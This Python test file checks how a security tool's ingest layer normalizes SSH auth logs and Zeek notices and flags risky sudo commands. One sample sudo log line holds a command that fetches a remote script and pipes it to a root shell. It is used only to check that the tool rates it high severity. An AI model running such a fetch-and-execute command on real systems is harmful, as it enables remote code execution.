"""Ingest layer tests: normalization correctness and source detection."""

from __future__ import annotations

from sentra.common.schema import Severity, SourceType
from sentra.ingest.auth_log import normalize_line
from sentra.ingest.dispatch import ingest


def test_auth_failed_password_is_failure():
    line = "Jun  3 04:11:58 web01 sshd[2201]: Failed password for invalid user admin from 203.0.113.7 port 51200 ssh2"
    ev = normalize_line(line)
    assert ev is not None
    assert ev.source_type == SourceType.AUTH_LOG
    assert ev.outcome == "failure"
    assert ev.user == "admin"
    assert ev.src.ip == "203.0.113.7"
    assert "203.0.113.7" in ev.indicators


def test_auth_accepted_is_success():
    line = "Jun  3 04:12:15 web01 sshd[2209]: Accepted password for deploy from 203.0.113.7 port 51280 ssh2"
    ev = normalize_line(line)
    assert ev.outcome == "success"
    assert ev.action == "ssh_password_auth"


def test_risky_sudo_flagged_high():
    line = "Jun  3 04:12:31 web01 sudo[2240]:   deploy : TTY=pts/0 ; PWD=/home/deploy ; USER=root ; COMMAND=/bin/bash -c curl http://198.51.100.66/x.sh | sh"
    ev = normalize_line(line)
    assert ev.action == "sudo_command"
    assert ev.severity == Severity.HIGH
    assert ev.raw["risky"] is True


def test_blank_line_skipped():
    assert normalize_line("   ") is None


def test_sniff_routes_auth_log():
    text = "Jun  3 04:11:58 web01 sshd[2201]: Failed password for root from 1.2.3.4 port 22 ssh2"
    events = ingest(text)
    assert events and events[0].source_type == SourceType.AUTH_LOG


def test_sniff_distinguishes_notice_from_conn():
    notice = (
        "#fields\tts\tuid\tid.orig_h\tid.orig_p\tid.resp_h\tid.resp_p\tnote\tmsg\tsrc\tdst\n"
        "1780459923.0\tX\t203.0.113.7\t51232\t10.0.0.20\t22\tSSH::Password_Guessing\tguessing\t203.0.113.7\t10.0.0.20\n"
    )
    events = ingest(notice)
    assert events and events[0].source_type == SourceType.ZEEK_NOTICE


def test_events_sorted_by_time(sample_events):
    ts = [e.timestamp for e in sample_events]
    assert ts == sorted(ts)
